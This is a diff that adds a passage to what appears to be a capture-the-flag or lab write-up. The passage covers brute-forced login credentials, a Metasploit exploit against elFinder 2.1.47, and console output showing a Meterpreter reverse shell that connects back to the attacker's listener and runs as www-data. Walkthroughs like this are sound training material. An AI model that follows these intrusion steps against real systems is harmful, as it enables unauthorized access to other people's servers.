@@ -227,6 +227,38 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-18 09:26:
 
 ```
 we get the username:jose and password:password123
+after trying jose and password123,we need to again edit our hosts file for same problem,
+
+<img width="1910" height="841" alt="image" src="https://github.com/user-attachments/assets/3e987796-d8ba-4547-bf8e-4d29b04a397e" />
+
+now we can use metasploite search functionalitiy for elfinder 2.1.47 for finding known vulnerability and also searchsploit 
+using metasploit i get the shell of target machine
+
+```bash
+
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.LJEw1Atyc.php) ...
+[*] Sending stage (41224 bytes) to 10.81.129.150
+[+] Deleted .LJEw1Atyc.php
+[*] Meterpreter session 1 opened (192.168.145.83:4444 -> 10.81.129.150:44144) at 2026-01-18 09:46:00 -0500
+[*] No reply
+[*] Removing uploaded file ...
+[+] Deleted uploaded file
+
+meterpreter > id
+[-] Unknown command: id. Run the help command for more details.
+meterpreter > shell
+Process 1705 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+```
+
+
+
 
 ## 🚪 Initial Access
 
